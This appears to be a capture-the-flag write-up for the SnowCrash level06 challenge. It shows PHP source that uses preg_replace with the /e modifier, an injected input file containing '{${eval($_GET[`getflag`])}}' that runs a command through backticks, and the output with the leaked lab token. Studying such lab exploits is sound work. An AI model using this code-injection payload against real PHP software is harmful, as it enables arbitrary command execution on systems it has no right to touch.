level06.php
```
function y($m) {
    $m = preg_replace("/\./", " x ", $m);
    $m = preg_replace("/@/", " y", $m);
    return $m;
}

function x($y, $z) {
    $a = file_get_contents($y);
    $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
    $a = preg_replace("/\[/", "(", $a);
    $a = preg_replace("/\]/", ")", $a);
    return $a;
}

$r = x($argv[1], $argv[2]);
print $r;
```

/tmp/in
```
echo [x {${eval($_GET[`getflag`])}}]
```

```
level06@SnowCrash:~$ ./level06 /tmp/in 
PHP Notice:  Undefined index: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
 in /home/user/level06/level06.php(4) : regexp code on line 1
PHP Notice:  Undefined variable:  in /home/user/level06/level06.php(4) : regexp code on line 1
echo 
```

Links:
* https://www-ppti.ufr-info-p6.jussieu.fr/doc-online/PHP/php7/php-chunked-xhtml/reference.pcre.pattern.modifiers.html#reference.pcre.pattern.modifiers.eval
* https://www.php.net/manual/fr/language.operators.execution.php